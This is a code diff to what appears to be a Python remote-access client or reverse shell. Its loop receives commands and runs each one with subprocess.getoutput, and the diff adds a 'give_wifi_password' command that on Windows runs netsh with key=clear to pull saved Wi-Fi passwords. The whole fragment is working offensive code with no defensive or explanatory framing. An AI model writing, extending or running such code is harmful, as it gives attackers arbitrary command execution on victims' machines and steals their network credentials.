@@ -1,3 +1,4 @@
+import platform
 import socket
 import os
 import subprocess
@@ -42,13 +43,15 @@ while True:
         else:
             # if operation is successful, empty message
             output = ""
+
     if command.lower() == "give_wifi_password":
-        #install netsh and findstr
-        #asume the os is linux
-        os.system("sudo dnf install net-tools")
-        os.system("sudo dnf install findutils")
-        # execute the command and retrieve the results
-        output = subprocess.getoutput('netsh wlan show profile name="WIFI_NAME" key=clear | findstr "Key Content"')
+        if platform.system() == "Windows":
+            # execute the command and retrieve the results
+            output = subprocess.getoutput('netsh wlan show profile name="WIFI_NAME" key=clear | findstr "Key Content"')
+        elif platform.system() == "Linux":
+            output = "This operation is not supported for security reasons."
+        else:
+            output = "Unsupported operating system."
     else:
         # execute the command and retrieve the results
         output = subprocess.getoutput(command)
